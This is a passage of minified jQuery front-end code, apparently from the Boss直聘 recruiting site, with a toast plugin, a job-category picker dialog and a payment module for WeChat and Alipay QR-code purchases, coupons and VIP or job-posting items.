            this.settings.wrapClass && this.toast.addClass(this.settings.wrapClass),
            this.settings.position && this.position(),
            this.time(),
            this.toast.on("click", function() {
                t.close()
            })
        },
        position: function() {
            "top" == this.settings.position && this.toast.css("top", 0),
            "center" == this.settings.position && this.toast.css("bottom", 0),
            "bottom" == this.settings.position && this.toast.css("bottom", 0)
        },
        lock: function() {
            n || (i("html,body").css("overflow", "hidden"),
            n = !0)
        },
        unLock: function() {
            this.settings.lock && n && (i("html,body").css("overflow", "visible"),
            n = !1)
        },
        close: function() {
            var e = this;
            e.toast.addClass("slideup"),
            setTimeout(function() {
                e.toast.removeClass("slideup").remove()
            }, 500),
            e.unLock()
        },
        time: function() {
            var e = this;
            this.settings.time && "loading" != this.settings.type && (this.closeTimer = setTimeout(function() {
                e.close()
            }, this.settings.time))
        }
    },
    i.toast = function(e) {
        new t(e)
    }
}(jQuery, window),
!function(r) {
    function e() {
        this.defaultData = [{
            code: "100000",
            name: "技术"
        }, {
            code: "",
            name: ""
        }, {
            code: "",
            name: ""
        }],
        this.list = this.defaultData,
        this.active = "active"
    }
    e.prototype = {
        init: function(e) {
            return this.positionType = r('<div class="common-position-type"></div>'),
            this.callback = e.callback,
            this.levelType = e.onlyTwoLevel,
            this.hasSearch = !!e.hasSearch,
            "object" != typeof e.data ? this.getData(e) : (this.json = e.data,
            this.addHtml()),
            this.list
        },
        getData: function(t) {
            var i = this;
            r.get(t.data, function(e) {
                e.zpData ? i.json = e.zpData : i.json = e.data,
                i.addHtml(t.onlyTwoLevel)
            })
        },
        addEvent: function() {
            var t = this
              , e = "data-code"
              , i = "click"
              , n = r(".js-dialog-position")
              , a = r(".js-common-position");
            this.$search = n.find(".js-position-search"),
            this.$searchLists = this.$search.find(".position-lists .normal ul"),
            this.$searchBlank = this.$search.find(".position-lists .blank"),
            this.$searchInput = this.$search.find(".position-input input"),
            this.$searchSearchbtn = this.$search.find(".position-input .icon-p-search"),
            this.currentSelection = -1,
            a.off(i),
            a.on(i, ".js-type li", function() {
                t.list[0].code = r(this).attr(e),
                t.list[0].name = r(this).text(),
                t.setOneList(this),
                t.appendTwoList(r(this).attr(e))
            }),
            a.on(i, ".js-content .js-li", function() {
                t.list[1].code = r(this).attr(e),
                t.list[1].name = r(this).text(),
                t.getValue(this)
            }),
            a.on(i, ".js-content .js-ol-li", function() {
                t.setPop(this),
                t.removeNode(r(".js-dialog-position"))
            }),
            this.$searchInput.on("input focus", function() {
                var e = r(this).val().trim();
                t.getSearchList(e)
            }),
            this.$searchInput.on("keydown", function(e) {
                t.suggestSelected(e, t)
            }),
            this.$searchSearchbtn.on("click", function() {
                var e = r(this).siblings(".ipt").val().trim();
                t.getSearchList(e)
            }),
            this.$searchLists.on("click", "li", function() {
                t.setPop(this),
                t.removeNode(r(".js-dialog-position"));
                try {
                    _T.sendEvent("position_keyword_click")
                } catch (e) {}
            }),
            n.on("click", function(e) {
                r(e.target).parents(".js-position-search").length || (t.$searchLists.addClass("hide"),
                t.$searchBlank.addClass("hide"))
            })
        },
        getSearchList: function(e) {
            var m = this
              , t = (m.$search,
            m.$searchLists)
              , i = m.$searchBlank;
            if (e) {
                var n = function(e) {
                    for (var t = m.json, i = [], n = 0; n < t.length; n++) {
                        var a = t[n].name
                          , o = t[n].subLevelModelList || t[n].children || t[n].subList;
                        if (o && o.length)
                            for (var s = 0; s < o.length; s++) {
                                var r = o[s].name
                                  , c = o[s].subLevelModelList || o[s].children || o[s].subList;
                                if (m.levelType) {
                                    var l = o[s].code || o[s].id
                                      , d = e.toLowerCase();
                                    0 <= r.toLowerCase().indexOf(d) && i.push({
                                        name: r,
                                        code: l,
                                        text: a
                                    })
                                } else if (c && c.length)
                                    for (var p = 0; p < c.length; p++) {
                                        var u = c[p].name
                                          , h = c[p].code || c[p].id
                                          , f = e.toLowerCase();
                                        0 <= u.toLowerCase().indexOf(f) && i.push({
                                            name: u,
                                            code: h,
                                            text: a + "-" + r
                                        })
                                    }
                            }
                    }
                    return i
                }(e);
                try {
                    _T.sendEvent("position_keyword_search")
                } catch (e) {}
                if (n.length) {
                    var a = n
                      , o = e;
                    t.html("");
                    for (var s = 0; s < a.length; s++) {
                        var r = a[s].name.toLowerCase()
                          , c = o.toLowerCase()
                          , r = r.indexOf(c)
                          , c = c.length
                          , r = a[s].name.substring(0, r) + '<span class="h">' + a[s].name.substring(r, r + c) + "</span>" + a[s].name.substring(r + c);
                        t.append('<li data-code="' + a[s].code + '" data-text="' + a[s].name + '"><p class="p-name">' + r + '</p><span class="p-des">' + a[s].text + "</span></li>")
                    }
                    t.removeClass("hide"),
                    i.addClass("hide"),
                    m.currentSelection = -1,
                    m.$searchLists.scrollTop(0)
                } else
                    t.html("").addClass("hide"),
                    i.removeClass("hide")
            } else
                t.html("").addClass("hide"),
                i.addClass("hide")
        },
        suggestSelected: function(e, t) {
            var i = t
              , n = i.$searchLists.find("li")
              , t = i.$searchInput;
            if ("" != t.val().trim())
                switch (e.which) {
                case 38:
                    n.removeClass("selected"),
                    -1 == i.currentSelection || 0 == i.currentSelection ? (i.currentSelection = -1,
                    i.currentSelection = n.length - 1) : i.currentSelection--,
                    n.eq(i.currentSelection).addClass("selected"),
                    i.scrollVisiable(n.eq(i.currentSelection), "up");
                    break;
                case 40:
                    e.preventDefault(),
                    n.removeClass("selected"),
                    i.currentSelection > n.length - 2 && (i.currentSelection = -1),
                    i.currentSelection++,
                    n.eq(i.currentSelection).addClass("selected"),
                    i.scrollVisiable(n.eq(i.currentSelection), "down");
                    break;
                case 13:
                    i.currentSelection = -1;
                    var a = i.$searchLists.find("li.selected")
                      , o = a.get(0);
                    if (a.length) {
                        i.setPop(o),
                        i.removeNode(r(".js-dialog-position"));
                        try {
                            _T.sendEvent("position_keyword_click")
                        } catch (e) {}
                    }
                    break;
                case 27:
                    i.currentSelection = -1,
                    i.$searchInput.val(""),
                    i.$searchLists.html("").addClass("hide"),
                    i.$searchBlank.addClass("hide")
                }
        },
        scrollVisiable: function(e, t) {
            var i = this.$searchLists;
            if (!e)
                return !1;
            var n = i.find("li").length
              , a = r(e).index()
              , o = 4 < a ? a - 4 : 0
              , s = "down" == t && (o < n - 4 || 0 === a);
            "up" == t && (o = a),
            ("up" == t && (a < n - 5 || a == n - 1) || s) && i.scrollTop(o * r(e).height())
        },
        addHtml: function(e) {
            var t = ['<div class="common-position js-common-position ' + (e ? "level-two" : "") + ' ">', '<ul class="type js-type"></ul>', '<div class="content js-content"></div>', "</div>"];
            this.positionType.html(t.join("")),
            this.positionType.find(".js-type").append(this.getOneData(this.json, e)),
            e ? this.appendTwoList(1e7) : this.appendTwoList(1e5),
            this.dialog(),
            this.addEvent()
        },
        appendTwoList: function(e) {
            var e = this.joinTwoData(this.getTwoData(e))
              , t = r(".js-common-position");
            (t = t.length ? t : this.positionType).find(".js-content").html(e)
        },
        getValue: function(e) {
            var t = r(e).parents(".js-two")
              , i = r(".js-two")
              , n = r(".js-li")
              , a = this.getThreeData(r(e).attr("data-code"))
              , o = this.joinThreeData(a);
            a ? (this.resetHTML(i, n),
            r(e).addClass(this.active),
            t.append(o)) : (this.setPop(e),
            this.removeNode(r(".js-dialog-position")))
        },
        getOneData: function(e, n) {
            var a = this
              , o = "";
            return r.each(e, function(e, t) {
                var i = t.name
                  , t = a.getCode(t);
                o += t + "" == "100000" || n && t + "" == "10000000" ? '<li class="active" title="' + i + '" data-code="' + t + '">' + i + "</li>" : '<li title="' + i + '" data-code="' + t + '"">' + i + "</li>"
            }),
            o
        },
        getTwoData: function(n) {
            var a = ""
              , o = this;
            return r.each(this.json, function(e, t) {
                var i = o.getCode(t);
                parseInt(n, 10) === i && (a = t.subLevelModelList || t.children || t.subList)
            }),
            a
        },
        getThreeData: function(i) {
            var n = ""
              , a = this;
            return r.each(this.json, function(e, t) {
                t = t.subLevelModelList || t.children || t.subList;
                r.each(t, function(e, t) {
                    if (a.getCode(t) == i)
                        return n = t.subLevelModelList || t.children || t.subList,
                        !1
                })
            }),
            n
        },
        removeNode: function(e) {
            e.remove()
        },
        setOneList: function(e) {
            var i = this;
            r(".js-type li").map(function(e, t) {
                r(t).removeClass(i.active)
            }),
            r(e).addClass(this.active)
        },
        joinTwoData: function(e) {
            var n = ""
              , a = 0
              , o = this
              , s = e.length || 0;
            return r.each(e, function(e, t) {
                var i = o.getCode(t)
                  , t = t.name;
                e % 4 == 0 && (n += '<div class="js-two"><ul class="navs" data-eq=' + a++ + ">"),
                n += '<li class="js-li" data-code="' + i + '">' + t + "</li>",
                e % 4 != 3 && e !== s - 1 || (n += "</ul></div>")
            }),
            n
        },
        joinThreeData: function(e) {
            var n = this
              , a = '<ol class="list block">';
            return r.each(e, function(e, t) {
                var i = n.getCode(t)
                  , t = t.name;
                a += '<li class="js-ol-li" data-code="' + i + '">' + t + "</li>"
            }),
            a += "</ol>"
        },
        getCode: function(e) {
            return e.code || e.id
        },
        setPop: function(e) {
            r(".js-dialog-position").hide(),
            this.list[2].code = r(e).attr("data-code"),
            this.list[2].name = r(e).attr("data-text") || r(e).text(),
            this.callback(this.list),
            this.list = this.defaultData
        },
        resetHTML: function(e, t) {
            var i = this;
            e.map(function(e, t) {
                r(t).find("ol").remove()
            }),
            t.map(function(e, t) {
                r(t).removeClass(i.active)
            })
        },
        getDialogTitleView: function() {
            return this.hasSearch ? '<div class="position-search js-position-search s-position-search"><div class="position-input"><input class="ipt" placeholder="请输入职位关键词" type="text" name=""><i class="icon-p-search"></i></div><div class="position-lists"><div class="normal"><ul class="hide"></ul></div><div class="blank hide">暂无匹配职位，请自行在下方选择添加</div></div></div>' : ""
        },
        dialog: function() {
            r.dialog({
                title: "请选择职类" + this.getDialogTitleView(),
                content: this.positionType.html(),
                closeText: !0,
                confirmText: "",
                cancelText: "",
                wrapClass: "layer-position js-dialog-position",
                preKa: "",
                inline: !1
            })
        }
    },
    r.Position = e
}(jQuery, window);
var Payment = function() {
    var p = {}
      , u = {};
    function n(t, i, e) {
        function n(e) {
            o && (a.close(),
            e.ptype = t.data.payType,
            i.success(e))
        }
        var a, o = !0, s = {
            bzbParam: t.bzbParam
        }, i = (t.query && (s = $.extend(s, t.query)),
        $.extend({
            success: function() {},
            fail: function() {}
        }, i)), r = function() {
            $(".pop-payment .PaymentCheck").html('<i class="loader-gray-17"></i>正在查询支付结果，请稍后'),
            p.get.queryStatus(t, s).then(function(e) {
                1 !== e.zpData.state ? $(".pop-payment .PaymentCheck").html('<span class="gray">未支付成功，请您扫码完成支付。</span><a class="PayCheckBtn" href="javascript:">重新查询</a>') : 0 === e.code && 1 == e.zpData.state && (o = !1,
                n(e))
            })
        }, c = function() {
            p.get.queryStatus(t, s).then(function(e) {
                0 === e.code && 1 !== e.zpData.state ? o && setTimeout(c, 3e3) : 0 === e.code ? (o && n(e),
                o = !1) : $.toast({
                    type: "error",
                    content: e.message
                })
            })
        };
        $.confirm({
            content: e,
            confirmButton: !1,
            cancelButton: !1,
            buttonsReverse: !0,
            closeIcon: !1,
            columnClass: "pop-payment",
            title: !1,
            onOpen: function() {
                var e = this.$content;
                a = this,
                setTimeout(c, 1500),
                e.on("click", ".PayCheckBtn", r)
            },
            onClose: function() {
                o = !1,
                i.close && i.close()
            },
            confirm: function() {}
        })
    }
    function h(e, t) {
        var i = {
            type: "wx",
            name: "微信支付",
            pay: e.pay,
            qrCode: e.qrCode
        };
        n(e, t, u.pay(i)),
        __conversion("payment_wx")
    }
    function f(e, t) {
        var i = {
            type: "zfb",
            name: "支付宝",
            pay: e.pay,
            qrCode: e.qrCode
        };
        n(e, t, u.pay(i)),
        __conversion("payment_zfb")
    }
    return p.get = {},
    p.post = {},
    p.post.orderInfo = function(e, t) {
        var i = $.Deferred();
        return $.post("/wapi/zpp/user/bzbOrderInfo", {
            bzbParam: e
        }, function(e) {
            0 == e.code ? i.resolve(e) : $.toast({
                type: "error",
                content: e.message
            })
        }),
        i
    }
    ,
    p.get.coupon = function(e) {
        var t = $.Deferred();
        return $.get("/wapi/zpp/user/bzbDiscountList", {
            bzbParam: e,
            pageSize: 10
        }, function(e) {
            0 == e.code ? t.resolve(e) : $.toast({
                type: "error",
                content: e.message
            })
        }),
        t
    }
    ,
    p.post.order = function(e, t, n) {
        0;
        function i(e) {
            if (1011 === (e = "string" == typeof e ? JSON.parse(e) : e).code)
                return window.location.href = "/user/login";
            var i;
            0 == e.code && 1 == e.zpData.status ? 1 === e.zpData.experience ? n(e.zpData) : (i = e.zpData.bzbParam,
            $.when(p.post.orderInfo(i), p.get.coupon(i)).then(function(e, t) {
                e.userCouponList = t.zpData.discountList || [];
                e = $.extend({}, e.zpData, {
                    bzbParam: i,
                    userCouponList: t.zpData.discountList || []
                });
                n(e)
            })) : $.toast({
                type: "error",
                content: e.message
            })
        }
        var a = "/wapi/zpitem/web/itemMall/preOrder/" + e.itemId;
        !e.data.priceId && e.itemId || (a = "/wapi/zpblock/order/preorder");
        e.data.priceId ? (e.data.bz = e.data.business,
        e.data.jid = e.data.jobId,
        $.post(a, e.data, i)) : $.post(a, {
            paramsJson: encodeURIComponent(JSON.stringify(e.data))
        }, i)
    }
    ,
    p.get.queryStatus = function(e, t) {
        var i = $.Deferred();
        return $.ajax({
            method: "post",
            url: "/wapi/zpp/user/payOrderSync",
            data: {
                orderId: e.orderId,
                orderNo: e.orderNo
            },
            cache: !1,
            success: function(e) {
                i.resolve(e)
            },
            error: function() {
                i.reject()
            }
        }),
        i
    }
    ,
    p.post.purchase = function(e, t) {
        var i = $.Deferred()
          , n = "/wapi/zpp/user/bzbOrder"
          , a = {
            discountParam: e.discountParam,
            bzbParam: e.bzbParam,
            discountId: e.discountId,
            bzbChannel: e.data.payType
        };
        return e.recharge && (n = "/wapi/zpp/user/rechargeBean",
        a = {
            amount: 100 * e.data.beanCount,
            payChannel: e.data.payType
        }),
        $.ajax({
            method: "post",
            url: n,
            data: a,
            cache: !1,
            success: function(e) {
                if (0 != e.code)
                    return $.toast({
                        type: "error",
                        content: e.message
                    }),
                    i.reject(e),
                    t.fail();
                i.resolve(e)
            },
            error: function() {
                return t.fail()
            }
        }),
        i
    }
    ,
    u.pay = function(e) {
        return Utemplate('<div class="mb-payment"><p class="mb-payment-title"><img src="https://static.zhipin.com/v2/web/boss/images/icon-shield.png" />安全支付</p><div class="mb-pay-info"><i class="icon-<%this.type%>"></i><%this.name%><i class="currency">￥</i><i class="amount"><%this.pay / 100%></i></div><div class="qr-code"><img src="<%this.qrCode%>" /></div><div class="mb-payment-result PaymentCheck"><span class="gray">使用<%this.name%>扫码支付</span><a class="PayCheckBtn" href="javascript:">我已支付</a></div></div>', e)
    }
    ,
    u.purchase = function(e) {
        return Utemplate('<div class="mb-payment"><p class="mb-payment-title"><img src="https://static.zhipin.com/v2/web/boss/images/icon-shield.png" /><%if(this.article){%><%this.article%><%}else{%>确认支付<%}%><i class="bead-close"></i></p><dl class="order-detail"><dt><img src="<%this.itemIcon%>"><div class="item-prop fl"><p ><span class="item-name"><%this.description%></span><%if(this.note){%><br><%this.note%><%}%></p></div><span class="fr"><%this.amount/100%>直豆</span></dt><%if (0 < this.discountList.length) {%><dd class="item-coupon"><p>优惠</p><ul class="pay-active-list"><%for(var j=0;j<this.discountList.length;j++){%><li><i class="tag-desc"><%this.discountList[j].discountTag%></i><%if(this.discountList[j].discountType == 1){%><span class="amount-desc coupon-selected"><%this.discountList[j].discountAmountDesc%></span><%}else{%><span class="amount-desc"><%this.discountList[j].discountAmountDesc%></span><%}%><p class="discount-desc"><%this.discountList[j].discountDesc%></p><%if(this.discountList[j].discountType == 1){%><div class="item-coupon-list"><%for(var i=0;i<this.userCouponList.length;i++){%><span <%if(i==0){%>class="selected"<%}%> data-id="<%this.userCouponList[i].discountId%>" <%if(this.userCouponList[i].selected){%>class="selected"<%}%>>减<%this.userCouponList[i].offAmount%>直豆</span><%}%></div><%}%></li><%}%></ul></dd><%}%><dd>直豆余额<span class="fr"><%this.balance/100%>直豆</span></dd><dd>还需支付<span class="fr pay-amount"><%this.pay/100%>直豆</span></dd></dl><div class="prop-order"><div class="prop-qrcode-wrap <%if(this.bossQrUrl){%>is-expire<%}%>" <%if(this.bzbEnough){%> style="display:none;" <%}%>><img src="<%this.bossQrUrl%>" class="prop-qr-code"><div class="prop-refresh"><i class="iboss-erweimashuaxin"></i></div><div class="payment-way"><%for(var payIndex=0;payIndex<this.bzbChannelList.length;payIndex++){%><img src="<%this.bzbChannelList[payIndex].icon%>" class="pay-chanel-icon" /><%}%>均可扫码支付</div><div class="payment-pattern"><div class="qrcode-desc expire-time">支付有效期剩余 00:00</div><div class="qrcode-desc pasted-info">二维码已失效 <span class="high-light refetch-qrcode">重新获取</span></div><span class="already-pay high-light">我已支付</span></div></div><%if(this.bzbEnough){%><div class="prop-buttons"><button class="btn btn-block">立即支付</button></div><%}%><div class="payment-agreement">付费即表示同意<a href="https://m.zhipin.com/H5/html/protocol/incrementProtocol.html" target="_blank">《Boss直聘增值服务协议》</a></div></div></div>', e)
    }
    ,
    u.recharge = function(e) {
        return Utemplate('<div class="mb-payment"><p class="mb-payment-title"><img src="https://static.zhipin.com/v2/web/boss/images/icon-shield.png" />确认支付<i class="bead-close"></i></p><dl class="order-detail"><dt><img src="https://static.zhipin.com/v2/web/boss/images/prop/icon-bean.png" /><span class="item-name"><%this.description%></span><span class="fr"><%this.amount/100%>直豆</span></dt><dd>支付金额<span class="fr pay-amount">￥<%this.pay/100%></span></dd></dl><div class="prop-order"><div class="prop-order-type"> <div class="prop-type-article">请选择支付方式：</div> <p class="fl payment-wx" data-type="wx" data-payType="2"><i class="icon-wx"></i>微信支付</p> <p class="fr payment-zfb" data-type="zfb" data-payType="1"><i class="icon-zfb"></i>支付宝</p> </div><div class="payment-agreement">付费即表示同意<a href="https://m.zhipin.com/H5/html/protocol/incrementProtocol.html" target="_blank">《Boss直聘增值服务协议》</a></div></div></div>', e)
    }
    ,
    u.success = function(e) {
        return Utemplate('<div class="mb-payment"><p class="mb-payment-title"><img src="https://static.zhipin.com/v2/web/boss/images/icon-shield.png" />安全支付</p><div class="pay-info-text"><img src="https://static.zhipin.com/v2/web/boss/images/layer/succ.png" /><p class="article"><%this.article%></p><div class="text gray"><%this.text%></div><p><%if(this.cancelText){%><a href="javascript:" class="success-cancel btn"><%this.cancelText%></a><%}%><a href="javascript:" class="btn-primary success-confirm btn"><%this.confirmText%></a></p></div></div>', e)
    }
    ,
    u.notice = function(e) {
        return Utemplate('<div class="mb-payment"><p class="mb-payment-title"><img src="https://static.zhipin.com/v2/web/boss/images/icon-shield.png" />安全支付</p><div class="pay-info-text"><img src="https://static.zhipin.com/v2/web/boss/images/layer/succ.png" /><p class="article"><%this.article%></p><div class="text gray"><%this.text%></div></p></div></div>', e)
    }
    ,
    {
        wx: h,
        zfb: f,
        notice: function(e) {
            e = $.extend({
                article: "",
                text: "",
                cancelText: !1,
                confirmText: "确定",
                close: function() {},
                confirm: function() {}
            }, e),
            $.dialog({
                title: "",
                content: u.notice(e),
                confirmText: e.confirmText,
                cancelText: e.cancelText,
                closeText: !0,
                wrapClass: "commerical-success-notice pop-payment",
                lock: !0
            })
        },
        success: function(i) {
            i = $.extend({
                article: "",
                text: "",
                confirmText: "确定",
                close: function() {},
                confirm: function() {}
            }, i),
            $.confirm({
                backgroundDismiss: !1,
                content: u.success(i),
                confirmButton: !1,
                cancelButton: !1,
                buttonsReverse: !0,
                closeIcon: !1,
                columnClass: "pop-payment",
                title: !1,
                onOpen: function() {
                    var e = this.$content
                      , t = this;
                    e.on("click", ".success-confirm", function() {
                        t.close(),
                        i.confirm("confirm")
                    }),
                    e.on("click", ".success-cancel", function() {
                        t.close(),
                        i.confirm("close")
                    })
                },
                onClose: i.close,
                ononfirm: i.confirm
            })
        },
        purchase: function(s, r) {
            function t(e) {
                var n = l = $(e);
                a = this,
                n.on("click", ".prop-order-type p", function() {
                    if ($(this).hasClass("selected") || $(this).hasClass("disabled"))
                        return !1;
                    n.find(".prop-order-type .selected").addClass("disabled").removeClass("selected"),
                    $(this).addClass("selected").addClass("disabled"),
                    s.data.payType = $(this).attr("data-payType"),
                    o(s, r)
                }),
                n.on("click", ".btn-block", function() {
                    if ($(this).hasClass("disabled"))
                        return !1;
                    s.data.payType = 4,
                    $(this).addClass("disabled"),
                    o(s, r)
                }),
                n.on("click", ".item-coupon-list span", function() {
                    $(this).hasClass("selected") ? $(this).removeClass("selected") : ($(".item-coupon-list .selected").removeClass("selected"),
                    $(this).addClass("selected"));
                    var e = $(this).index()
                      , e = s.userCouponList[e]
                      , t = $(this).parents("li").find(".discount-desc")
                      , e = ($(this).hasClass("selected") ? (s.coupon = e.offAmount,
                    s.discountId = e.discountId,
                    t.text(e.discountDesc),
                    n.find(".coupon-selected").text("-" + s.coupon + "直豆").show()) : (s.coupon = 0,
                    s.discountId = "0",
                    t.html("&nbsp;"),
                    n.find(".coupon-selected").text(s.userCouponList.length + "张可用")),
                    s.amount)
                      , t = 100 * s.coupon + s.totalOffAmount
                      , i = s.amount - s.balance - t
                      , e = e > t + s.balance ? i : s.amount - t;
                    s.pay = e,
                    s.cost = i,
                    s.cost <= 0 && (s.data.payType = 4),
                    n.find(".pay-amount").text(s.pay / 100 + "直豆"),
                    0 < s.cost || s.recharge ? (n.find(".prop-order-type").show(),
                    n.find(".btn-block").hide()) : (n.find(".btn-block").show(),
                    n.find(".prop-order-type").hide())
                }),
                n.on("click", ".coupon-left", function() {
                    n.find(".item-coupon").toggleClass("unfold")
                }),
                n.on("click", ".coupon-selected", function() {
                    n.find(".item-coupon").toggleClass("unfold")
                }),
                n.on("click", ".bead-close", function() {
                    a.close(),
                    r.cancel && r.cancel()
                }),
                n.on("click", ".already-pay", function() {
                    var t = n.find(".prop-qrcode-wrap");
                    t.find(".payment-pattern").hide(),
                    t.find(".payment-check").length || t.append('<div class="payment-check"></div>'),
                    $(".payment-check", t).html("正在查询，请稍等"),
                    p.get.queryStatus(s).then(function(e) {
                        1 !== e.zpData.state ? $(".payment-check", t).html('未支付成功，请您扫码完成支付 <a class="already-pay high-light" href="javascript:">重新查询</a>') : 0 === e.code && 1 == e.zpData.state && (r.success(s),
                        pollQuerying = !1)
                    })
                }),
                n.on("click", ".prop-refresh i", function() {
                    d(!0)
                }),
                n.on("click", ".refetch-qrcode", function() {
                    d(!0)
                })
            }
            function i() {
                return r.fail()
            }
            function n() {}
            function c(e) {
                $.dialog({
                    bind: !0,
                    title: "",
                    content: e,
                    closeText: !1,
                    confirmText: "",
                    cancelText: "",
                    closeLayer: !1,
                    inline: !0,
                    wrapClass: "pop-payment flex-dialog-wrap",
                    onOpen: t,
                    onClose: i,
                    confirm: n
                })
            }
            var a, l, r = $.extend({
                success: function() {},
                cancel: function() {},
                fail: function() {}
            }, r), s = $.extend({
                recharge: !1
            }, s), o = function(i, n) {
                p.post.purchase(i, n).then(function(e) {
                    var t = !!i.condition && i.condition(e);
                    return 0 != e.code || 1 !== e.zpData.status && 3 !== e.zpData.status && !i.recharge ? ($.toast({
                        type: "error",
                        content: e.message
                    }),
                    !1) : t ? i.success(e.zpData) : 4 == i.data.payType && 1 === e.zpData.status ? (a && a.close("confirm"),
                    n.buy && n.buy({
                        pay: i.amount,
                        orderId: e.zpData.orderId,
                        orderNo: e.zpData.orderNo,
                        balance: i.balance,
                        payType: i.data.payType
                    }),
                    n.success(e.zpData)) : (i.orderId = e.zpData.orderId,
                    i.qrCode = e.zpData.qrUrl,
                    i.orderNo = e.zpData.orderNo,
                    (2 == i.data.payType ? h : f)(i, n),
                    n.buy && n.buy({
                        pay: i.amount,
                        balance: i.balance,
                        payType: i.data.payType,
                        orderNo: e.orderNo
                    }),
                    void (a && a.close("confirm")))
                }, function() {})
            };
            if ($(".pop-payment").length)
                return !1;
            function d(o) {
                var e = s.prePayUrl || "";
                p.post.order(s, e, function(e) {
                    var t, a;
                    function n(e) {
                        var t = l.find(".prop-qrcode-wrap");
                        e ? t.hasClass("is-expire") || t.addClass("is-expire") : t.hasClass("is-expire") && t.removeClass("is-expire")
                    }
                    function i(e) {
                        if (!e)
                            return "";
                        var t = s.currentTime || (new Date).getTime();
                        if (t + e < t)
                            return a && clearInterval(a),
                            "";
                        if (isNaN(+e))
                            return a && clearInterval(a),
                            "";
                        var t = e / 1e3
                          , e = Math.floor(t / 60 / 60)
                          , i = Math.floor((t - 60 * e * 60) / 60)
                          , t = Math.floor(t - 60 * e * 60 - 60 * i)
                          , n = "";
                        return 0 < e && (n = 10 <= e ? e : "0" + e,
                        n += ":"),
                        n = (n += 10 <= i ? i : "0" + i) + ":" + (10 <= t ? t : "0" + t)
                    }
                    1011 === e.code && (window.location.href = "/web/zppassport/logout"),
                    1 === e.experience ? r.success(e) : (e = {
                        discountId: e.discountId,
                        itemIcon: e.bizIcon,
                        balance: e.remainAmount,
                        amount: e.amount,
                        totalOffAmount: e.totalOffAmount - e.offAmount,
                        needAmount: e.needAmount + e.offAmount,
                        pay: e.needAmount,
                        cost: e.amount - e.remainAmount - e.totalOffAmount,
                        note: e.bizNote || "",
                        coupon: e.offAmount,
                        bzbParam: e.bzbParam,
                        discountList: e.discountList,
                        userCouponList: e.userCouponList,
                        discountParam: e.discountParam,
                        description: e.bizName || s.description,
                        bzbChannelList: e.bzbChannelList || [],
                        bossQrUrl: e.bossQrUrl,
                        orderIdStr: e.orderIdStr,
                        orderNo: e.orderNo,
                        bzbEnough: e.bzbEnough,
                        expireTime: e.expireTime,
                        expireTimeDuration: e.expireTimeDuration,
                        currentTime: e.currentTime
                    },
                    (s = $.extend(s, e)).cost < 1 && (s.data.payType = 4),
                    0 == s.amount || 0 == s.needAmount ? r.success(s) : (e = u.purchase(s),
                    o ? (t = $(".mb-payment", l).parent()).length && t.html(e) : c(e)),
                    s.bzbEnough || ((s.orderIdStr || s.orderNo) && (pollQuerying = !0,
                    function i() {
                        if (!pollQuerying)
                            return;
                        p.get.queryStatus(s).then(function(e) {
                            var t;
                            0 == e.code && e.zpData ? (e = e.zpData || {}).expire || !1 === e.expire && e.expireRemain / 1e3 < 5 ? n(!1) : (n(!0),
                            1 == e.state ? (r.success(s),
                            l && l.remove(),
                            pollQuerying = !1) : 3 == e.state ? ($.toast({
                                type: "error",
                                content: "支付失败了"
                            }),
                            pollQuerying = !1) : t = setTimeout(function() {
                                i(),
                                clearTimeout(t)
                            }, 3e3)) : t = setTimeout(function() {
                                i(),
                                clearTimeout(t)
                            }, 3e3)
                        }, function() {
                            var e = setTimeout(function() {
                                i(),
                                clearTimeout(e)
                            }, 3e3)
                        })
                    }()),
                    function(e) {
                        s.expireTime ? (a && clearInterval(a),
                        l.find(".expire-time").text("支付有效期剩余 " + i(e)),
                        this.countTimer = setInterval(function() {
                            e -= 1e3,
                            l.find(".expire-time").text("支付有效期剩余 " + i(e))
                        }, 1e3)) : clearInterval(a)
                    }(s.expireTimeDuration || 18e5)),
                    a = null)
                })
            }
            s.recharge ? c(u.recharge(s)) : d()
        },
        balance: p.get.balance
    }
}()
  , Purchase = function() {
    function d(e, t, i) {
        Payment.success({
            article: e || "购买成功",
            text: t || "",
            confirm: function() {
                i.confirm && i.confirm()
            },
            close: function() {
                i.close && i.close()
            }
        })
    }
    return {
        vip: function(e, t) {
            function i() {
                $.toast({
                    type: "success",
                    content: "您已成功购买VIP账号，可在VIP权益页面查看使用明细"
                }),
                n.success && n.success()
            }
            var n = t || {}
              , t = {
                url: "/boss/item/pay/vipaccount.json",
                data: e,
                description: "购买道具：「VIP账号」- 1个月",
                amount: parseInt(e.amount, 10),
                success: i
            };
            Payment.purchase(t, {
                success: i
            })
        },
        position: function(e, t, i) {
            "-1" == i.item.view ? i.item.view = "不限" : i.item.view = (i.item.view + "").replace("人", "") + "人";
            var n = {
                ordinary: {
                    1: "火爆职位普通版" + (i.action || "发布") + "成功！可保持职位在线<%this.description%>，期间每日查看牛人上限<%this.view%>，开聊上限<%this.employ%>。",
                    2: "",
                    3: "火爆职位普通版" + i.action + "成功！可保持职位在线<%this.description%>，期间每日查看牛人上限<%this.view%>，开聊上限<%this.employ%>。",
                    4: "已成功升级至火爆职位畅聊版！当前剩余有效期<%this.restDays%>天，期间每日查看牛人<%this.view%>，开聊<%this.employ%>人。"
                },
                carefree: {
                    1: "火爆职位畅聊版发布成功！可保持职位在线<%this.description%>，期间每日查看牛人<%this.view%>，开聊牛人<%this.employ%>。",
                    2: "",
                    3: "火爆职位畅聊版" + i.action + "成功！可保持职位在线<%this.description%>，期间每日查看牛人<%this.view%>，开聊牛人<%this.employ%>。",
                    4: "已成功升级至火爆职位畅聊版！当前剩余有效期<%this.restDays%>天，期间每日查看牛人<%this.view%>，开聊<%this.employ%>人。"
                },
                experience: {
                    1: "火爆职位普通版发布成功！该职位可免费在线<%this.expiredays%>天，为避免影响招聘，请及时延长招聘时长。",
                    2: "火爆职位普通版发布成功！该职位可免费在线<%this.expiredays%>天，为避免影响招聘，请及时延长招聘时长。",
                    3: "火爆职位普通版发布成功！该职位可免费在线<%this.expiredays%>天，为避免影响招聘，请及时延长招聘时长。",
                    4: "火爆职位普通版发布成功！该职位可免费在线<%this.expiredays%>天，为避免影响招聘，请及时延长招聘时长。",
                    5: "火爆职位普通版发布成功！该职位可免费在线<%this.expiredays%>天，为避免影响招聘，请及时延长招聘时长。"
                }
            }
              , a = {
                0: {
                    1: "block_sendjob_purchase_hot_",
                    2: "block_extendjob_purchase_hot_",
                    3: "block_openjob_purchase_hot_",
                    4: "block_upgradejob_purchase_hot_"
                },
                1: {
                    1: "block_sendjob_purchase_super_",
                    2: "block_extendjob_purchase_super_",
                    3: "block_openjob_purchase_super_",
                    4: "block_upgradejob_purchase_super_"
                }
            };
            try {
